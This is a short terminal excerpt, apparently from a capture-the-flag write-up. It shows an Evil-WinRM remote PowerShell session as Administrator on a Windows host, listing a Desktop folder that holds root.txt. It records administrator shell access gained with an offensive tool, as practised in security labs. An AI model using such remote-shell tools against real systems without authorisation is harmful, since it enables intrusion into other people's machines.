                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> ls ..\\Desktop

    Directory: C:\\Users\\Administrator\\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025   4:58 PM             34 root.txt
```
